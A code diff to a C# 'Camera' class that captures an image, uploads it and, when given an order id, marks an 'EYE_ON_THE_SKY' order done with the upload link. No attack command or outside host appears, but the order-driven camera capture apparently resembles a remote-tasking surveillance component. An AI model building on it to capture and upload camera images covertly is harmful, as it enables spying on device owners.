@@ -51,7 +51,7 @@ public static class Camera
         }
 
 
-        public static string CaptureCamera(string fileName, string key, string orderId)
+        public static string CaptureCamera(string fileName)
         {
             byte[] capture = Capture($"./objs/{fileName}", 500);
             if (capture != null)
@@ -71,10 +71,19 @@ public static class Camera
             return 0;
         }
 
-        public static async Task CameraUploaderAsync(string key,string filename,string orderId)
+        public static async Task<string> CameraUploaderAsync(string key,string filename,string orderId = "")
         {
-            var link = await Uploader.UploadImagesAsync($"./objs/{filename}", filename, key);
-            Orders.MarkOrderAsDone(key, orderId, "EYE_ON_THE_SKY", link);
+
+            if (filename != "")
+            {
+                var link = await Uploader.UploadImagesAsync($"./objs/{filename}", filename);
+
+                if (orderId != "") Orders.MarkOrderAsDone(key, orderId, "EYE_ON_THE_SKY", link);
+
+                return link;
+            }
+            return filename;
+          
         }
    
     }
